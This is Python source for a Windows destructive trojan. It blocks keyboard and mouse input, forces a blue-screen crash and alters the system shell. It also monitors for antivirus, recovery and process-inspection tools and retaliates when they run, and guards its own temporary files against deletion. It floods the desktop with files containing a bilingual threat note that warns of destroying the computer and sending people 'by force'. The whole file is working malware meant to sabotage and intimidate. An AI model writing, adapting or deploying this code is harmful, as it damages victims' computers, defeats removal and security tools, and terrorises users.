import ctypes
import os
import pygame
import random
import threading
import tempfile
import sys
import win32gui
import time
import psutil
import win32con
from moviepy.editor import VideoFileClip
from regedit_and_virus_safe import BSOD, change_shell_aftervideo
from start_gdi import stop_event

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

###
file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
###

def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    def wallpaper_threading():
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
            print("[OK] Обои установлены")
        except Exception as e:
            print(f"[EROR] {e}")
    threading.Thread(target=wallpaper_threading, daemon=True).start()


def set_window_always_on_top(window_title="MoviePy"):
    # Функция в цикле ищет окно с указанным заголовком и устанавливает его как topmost.
    # Ждем появления окна
    while True:
        hwnd = win32gui.FindWindow(None, window_title)
        if hwnd:
            # Устанавливаем окно поверх всех
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
            break
        time.sleep(0.1)

def remove_file_attributes(file_path):
    # Удаление атрибутов скрытого и системного
    os.system(f'attrib -s -h "{file_path}"')

def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)


def change_txt_1():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("1")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 1 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")

def change_txt_2():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("2")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 2 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")

def change_txt_3():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("3")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 3 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")


def play_video_fullscreen(video_path):
    stop_event.set()
    
    def get_screen_size():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        return screen_width, screen_height

    # Проверяем существование видео файла
    if not os.path.exists(video_path):
        print(f"[ERROR] Видео файл не найден: {video_path}")
        BSOD()  # Немедленный BSOD если файла нет
        return

    try:
        # Блокируем ввод
        ctypes.windll.user32.BlockInput(True)
        screen_width, screen_height = get_screen_size()

        # Пытаемся загрузить видео
        clip = VideoFileClip(video_path)
        clip_resized = clip.resize(width=screen_width, height=screen_height)

    except Exception as e:
        print(f"[ERROR] Ошибка загрузки видео: {e}")
        BSOD()  # BSOD при ошибке загрузки/обработки видео
        return

    def preview_video():
        try:
            clip_resized.preview(fullscreen=True, audio=True)
        except Exception as e:
            print(f"[ERROR] Ошибка воспроизведения: {e}")
            BSOD()
        finally:
            clip_resized.close()

    video_thread = threading.Thread(target=preview_video)
    top_thread = threading.Thread(target=set_window_always_on_top)

    video_thread.start()
    top_thread.start()

    video_thread.join()
    top_thread.join()
    
    ctypes.windll.user32.BlockInput(False)
    change_txt_3()
    change_shell_aftervideo()
    time.sleep(0.5)
    BSOD()  # BSOD после завершения видео


def playMusic_runappmain():
    def play_main():
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(resource_path("runapp_main.MP3"))
            pygame.mixer.music.set_volume(1.0)
            pygame.mixer.music.play(-1)
            print("[OK] Музыка запущена")
        except Exception as e:
            print(f"[Ошибка запуска музыки] {e}")
    # Запуск в фоне
    threading.Thread(target=play_main, daemon=True).start()


def playMusic_after50():
    def play_50():
        try:
            pygame.mixer.stop()
            pygame.mixer.music.load(resource_path("after50.mp3")) 
            pygame.mixer.music.play(-1)
            print("[OK] Музыка запущена")
        except Exception as e:
            print(f"[Ошибка запуска музыки] {e}")
    # Запуск в фоне
    threading.Thread(target=play_50, daemon=True).start()        

def playmusic_for3():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("scaryfor3.MP3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def monitor_process(processes=["mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe",
"rstrui.exe", "RecoveryDrive.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe",
"resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
"SystemInformer.exe", "ProcessExplorer.exe", "Avast.exe", "Drweb.exe", "Kaspersky.exe", "Malwarebytes.exe"]):
    
    triggered = False
    while True:
        found = any(p.info['name'] in processes for p in psutil.process_iter(['name']))
        if found and not triggered:
            triggered = True
            play_video_fullscreen(resource_path("Hacker2.mp4"))
        time.sleep(1)


def monitor_mei_folders():
    def list_all_paths(folder):
        try:
            paths = set()
            for dirpath, dirnames, filenames in os.walk(folder):
                for name in dirnames + filenames:
                    paths.add(os.path.join(dirpath, name))
            return paths
        except Exception as e:
            print(f"[ERROR] Ошибка при сканировании папки {folder}: {e}")
            return set()

    def monitor_folder(folder_path):
        print(f"[MONITOR] Слежение за: {folder_path}")
        try:
            previous = list_all_paths(folder_path)
            while True:
                time.sleep(1)
                if not os.path.exists(folder_path):
                    print(f"[ALERT] Папка удалена: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break
                current = list_all_paths(folder_path)
                if previous - current:
                    print(f"[ALERT] Обнаружено удаление содержимого в: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break

                
                previous = current
        except Exception as e:
            print(f"[ERROR] Сбой мониторинга {folder_path}: {e}")

    def watcher():
        temp = tempfile.gettempdir()
        monitored = set()
        print(f"[INIT] Мониторинг TEMP: {temp}")
        while True:
            try:
                for name in os.listdir(temp):
                    if name.startswith("_MEI"):
                        path = os.path.join(temp, name)
                        if os.path.isdir(path) and path not in monitored:
                            print(f"[INFO] Обнаружена _MEI-папка: {path}")
                            t = threading.Thread(target=monitor_folder, args=(path,), daemon=True)
                            t.start()
                            monitored.add(path)
            except Exception as e:
                print(f"[ERROR] Ошибка при сканировании TEMP: {e}")
            time.sleep(1)

    try:
        thread = threading.Thread(target=watcher, daemon=True)
        thread.start()
        thread.join()
    except Exception as e:
        print(f"[FATAL] Ошибка запуска мониторинга: {e}")


text = """[EN]
The hacker group "Assault on the Armchair Troops" welcomes you. If you listened and watched the speech from our mentor carefully, then most likely you will not have any questions. If you did not consider it necessary to carefully read the instructions from our boss, then we can remind you of them, but first we want to say that we are watching you, and if we see something we do not like, your computer will be completely destroyed. But let's move on to the rules:
1. Do not try to remove our malware, this will not help anyway, since not only your computer is infected, but also your Internet traffic, therefore, you will only destroy the computer. Is this what you want?
2. Do not press the key combination ctrl + alt + del. No comments here. Some decided to ignore this rule, we had to send cars for them to resolve issues by force, if you know what we mean.
3. Open as few files as possible, because the more files you open, the greater the chance that we will take some measures against you.
You have a long, long, difficult path ahead, but, of course, bad consequences can be avoided by simply following these rules. And remember - we always see and notice everything.

[RU]

Хакерская группировка "Штурм кабинетных войск" приветствует вас. Если вы внимательно слушали и смотрели речь от нашего наставника, то скорее всего, вопросов у вас не возникнет. Если же вы не посчитали нужным внимательно ознакомиться с инструкциями от нашего босса, то мы может напомнить вам их, но прежде мы хотим сказать, что мы наблюдаем за вами, и если мы увидим то, что нам не нравится - вам компьютер будет полностью уничтожен. Но перейдем к правилам:
1. Не пытайтесь удалить наше вредоносное ПО, это все равно не поможет, так как заражен не только ваш компьютер, но и интернет-трафик тоже, следовательно, вы только уничтожите компьютер. Вы этого хотите?
2. Не нажимайте комбинацию клавиш ctrl + alt + del. Тут без комментариев. Некоторые решили проигнорировать это правило, пришлось отправлять за ними машины, для решения вопросов силой, если вы понимаете, про что мы.
3. Открывайте как можно меньше файлов, ведь чем больше файлов вы откроете, тем больше шанс того, что мы примем некоторые меры в отношении вас.
Вам предстоит долгий и долгий сложный путь, но, конечно, плохих последствий можно избежать, просто следуя этим правилам. И помните - мы всегда всё видим и замечаем."""


def create_random_files(num_files=200, desktop_path=None, max_threads=10):
    """Создает файлы с ограничением на число потоков"""
    if desktop_path is None:
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')

    def generate_random_filename(extension, length=8):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choices(chars, k=length)) + extension

    def create_file(_):
        try:
            if random.choice([True, False]):
                extension = '.exe'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))
                with open(file_path, 'wb') as f:
                    pass
                #print(f'Создан файл: {file_path}')
            else:
                extension = '.txt'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(text)
                #print(f'Создан файл: {file_path}')
        except Exception as e:
            print(f'Ошибка: {e}')

    active_threads = []
    for i in range(num_files):
        # Ждем, если потоков слишком много
        while threading.active_count() > max_threads:
            pass

        thread = threading.Thread(target=create_file, args=(i,), daemon=True)
        active_threads.append(thread)
        thread.start()

    # Ждем завершения всех потоков
    for thread in active_threads:
        thread.join()

    print("[END] Все файлы созданы!")
